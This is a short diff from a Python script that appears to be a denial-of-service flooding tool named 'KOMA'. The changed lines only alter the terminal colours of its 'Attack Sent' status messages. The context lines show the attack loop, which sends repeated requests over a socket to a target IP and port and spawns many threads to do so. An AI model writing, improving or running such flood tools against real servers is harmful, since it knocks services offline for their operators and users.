@@ -96,11 +96,11 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[★\033[96m]  \033[96m[KOMA]  \033[33m[Attack Sent]  \033[92m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[★\033[96m]  \033[96m[KOMA]  \033[33m[Attack Sent]  \033[92m{0}:{1}  \033[1m{2}\033[0m".format(str(ip), int(port), xx))
                 
         except:
                 s.close()
-                print("\033[96m[!\033[96m]  \033[96m[KOMA]  \033[33m[Attack Sent]  \033[92m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
+                print("[x]  \033[95m[KOMA]  \033[33m[Attack Sent]  \033[92m{0}:{1}  \033[31m{2}\033[0m".format(str(ip), int(port), xx))
                     
 for x in range(thread):
     thred = threading.Thread(target=start)
